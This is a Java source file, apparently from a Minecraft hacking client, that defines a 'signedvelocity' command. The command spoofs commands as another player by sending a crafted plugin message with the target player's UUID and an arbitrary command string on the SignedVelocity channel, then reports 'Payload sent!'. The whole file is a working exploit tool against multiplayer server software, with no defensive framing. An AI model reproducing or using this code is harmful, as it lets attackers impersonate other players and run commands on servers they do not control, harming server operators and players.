package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.command.CommandSource;
import net.paradise_client.Helper;
import net.paradise_client.command.Command;

public class SignedVelocityCommand extends Command {
  public SignedVelocityCommand() {
    super("signedvelocity", "Spoofs player sent commands");
  }

  @Override public void build(LiteralArgumentBuilder<CommandSource> root) {
    root.executes(context -> {
      Helper.printChatMessage("Incomplete command!");
      return SINGLE_SUCCESS;
    }).then(argument("user", StringArgumentType.word()).suggests((ctx, builder) -> {
      String partialName;

      try {
        partialName = ctx.getArgument("user", String.class).toLowerCase();
      } catch (IllegalArgumentException ignored) {
        partialName = "";
      }

      if (partialName.isEmpty()) {
        getMinecraftClient().getNetworkHandler()
          .getPlayerList()
          .forEach(playerListEntry -> builder.suggest(playerListEntry.getProfile().getName()));
        return builder.buildFuture();
      }

      String finalPartialName = partialName;

      getMinecraftClient().getNetworkHandler()
        .getPlayerList()
        .stream()
        .map(PlayerListEntry::getProfile)
        .filter(player -> player.getName().toLowerCase().startsWith(finalPartialName.toLowerCase()))
        .forEach(profile -> builder.suggest(profile.getName()));

      return builder.buildFuture();
    }).executes(context -> {
      Helper.printChatMessage("Incomplete command!");
      return SINGLE_SUCCESS;
    }).then(argument("command", StringArgumentType.greedyString()).executes(context -> {
      String user = context.getArgument("user", String.class);
      for (PlayerListEntry p : getMinecraftClient().getNetworkHandler().getPlayerList()) {
        if (p.getProfile().getName().equalsIgnoreCase(user)) {
          String command = context.getArgument("command", String.class);
          String uuid = p.getProfile().getId().toString();
          Helper.sendPluginMessage("signedvelocity:main", out -> {
            out.writeUTF(uuid);
            out.writeUTF("COMMAND_RESULT");
            out.writeUTF("MODIFY");
            out.writeUTF("/" + command);
          });
          Helper.printChatMessage("Payload sent!");
          return SINGLE_SUCCESS;
        }
      }

      Helper.printChatMessage("Player not found!");
      return SINGLE_SUCCESS;
    })));
  }
}
